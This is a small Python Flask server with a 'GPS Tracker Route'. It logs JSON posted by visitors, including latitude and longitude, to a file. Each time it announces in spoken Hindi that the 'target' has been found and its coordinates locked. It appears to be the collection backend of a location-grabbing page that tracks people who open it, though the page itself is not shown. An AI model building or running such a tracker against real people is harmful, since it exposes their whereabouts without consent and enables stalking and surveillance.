from flask import Flask, render_template, request, jsonify
import datetime, os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')  # Keep your existing homepage

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    with open('logs.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - {data}\n")
    os.system('espeak -v hi "Target mil gaya. Coordinates locked."')
    return {'status': 'logged'}

# 🆕 GPS Tracker Route
@app.route('/get_location', methods=['POST'])
def get_location():
    data = request.json
    lat = data['latitude']
    lon = data['longitude']
    with open("logs.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - [GPS] Latitude: {lat}, Longitude: {lon}\n")
    os.system('espeak -v hi "GPS se target prapt ho gaya. Sthal sanket lock kiya ja raha hai."')
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
